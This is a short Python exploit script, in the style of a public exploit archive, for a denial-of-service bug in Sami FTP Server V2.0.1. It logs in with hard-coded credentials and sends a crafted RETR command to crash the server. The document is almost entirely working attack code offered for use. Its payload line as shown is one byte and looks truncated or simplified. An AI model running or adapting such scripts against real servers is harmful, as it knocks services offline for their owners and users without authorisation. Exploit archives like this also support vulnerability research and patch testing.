#!/usr/bin/python
#
#
# Exploit Title: Sami FTP Server RETR Denial Of Service
# Date: 2013/6/09
# Exploit Author: Chako
# Vendor Homepage: http://www.karjasoft.com/old.php
# Software Link: 
# Version: V2.0.1 (Doesn't work on V2.0.2)
# Tested on: Windows XP SP3
# Description:
#       A bug discovered  in Sami FTP Server allows an attacker
#       to cause a Denial of Service using a specially crafted request.



import socket
import sys

USER="chako"
PASSWD="chako"
PAYLOAD="\x41" 

print("\n\n[+] Sami FTP Server RETR Denial Of Service")
print("[+] Version: V2.0.1")
print("[+] Chako\n\n\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))
data = s.recv(1024)


print("[-] Login to FTP Server...\n")
s.send("USER " + USER + '\r\n')
data = s.recv(1024)
s.send("PASS " + PASSWD + '\r\n')
data = s.recv(1024)



print("[-] Sending exploit...\n")
s.send("RETR " + PAYLOAD + '\r\n')
s.close()

print("[!] Done! Exploit successfully sent\n")